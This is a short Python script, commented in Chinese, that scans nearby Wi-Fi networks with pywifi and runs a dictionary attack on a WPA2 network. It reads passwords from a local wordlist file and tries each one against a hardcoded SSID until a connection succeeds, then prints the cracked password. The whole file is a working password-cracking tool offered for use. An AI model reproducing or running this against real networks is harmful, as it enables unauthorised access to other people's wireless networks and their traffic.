import pywifi
from comtypes import GUID
from pywifi import const  # 引用一些定义

import time

namelist = []
ssidlist = []
result = []  # 存放查询到的WIFI,密码
wificount = 5  # 查询附近信号最强的5个WIFI，最多5个


def getwifi():
    wifi = pywifi.PyWiFi()  # 抓取网卡接口
    ifaces = wifi.interfaces()[0]  # 获取网卡
    ifaces.scan()
    time.sleep(8)
    bessis = ifaces.scan_results()

    list = []
    for data in bessis:
        if (data.ssid not in namelist):  # 去掉重复的WIFI名称
            namelist.append(data.ssid)
            list.append((data.ssid, data.signal))

    sorted(list, key=lambda st: st[1], reverse=True)
    time.sleep(1)
    n = 0
    if len(list) is not 0:
        for item in list:
            if (item[0] not in ssidlist):
                n = n + 1
                if n <= wificount:
                    ssidlist.append(item[0])
    print(ssidlist)


def testwifi(ssidname, password):
    wifi = pywifi.PyWiFi()                  # 抓取网卡接口
    ifaces = wifi.interfaces()[0]           # 获取网卡
    ifaces.disconnect()                     # 断开无限网卡连接
    print(ifaces)
    profile = pywifi.Profile()              # 创建wifi连接文件
    profile.ssid = ssidname                 # 定义wifissid
    profile.auth = const.AUTH_ALG_OPEN      # 网卡的开放
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
    profile.cipher = const.CIPHER_TYPE_CCMP     # 加密单元
    profile.key = password                      # wifi密码
    ifaces.remove_all_network_profiles()  # 清理其他配置文件
    tmp_profile = ifaces.add_network_profile(profile)  # 加载配置文件
    ifaces.connect(tmp_profile)                 # 连接wifi

    for i in range(1, 10):
        if ifaces.status() == const.IFACE_CONNECTING:
            time.sleep(1)                        # 5秒内能否连接上

    if ifaces.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False
    # ifaces.disconnect()#断开连接
    return True


def main():
    i = 0
    ssidname = 'TP_LINK_1110'  # 如果知道WIFI直接写就行了。
    path = r"D:/CrackPasswd/pass.txt"
    files = open(path, 'r')
    while True:
        try:
            password = files.readline().strip('\n')
            if password == "":
                break
            else:
                i = i + 1
                print(i)
                if (testwifi(ssidname, password)):
                    print(
                        'Succ',
                        'Current WifiName:',
                        ssidname,
                        'Current Password:',
                        password)
                    break
        except BaseException:
            continue

    files.close()


if __name__ == '__main__':
    main()
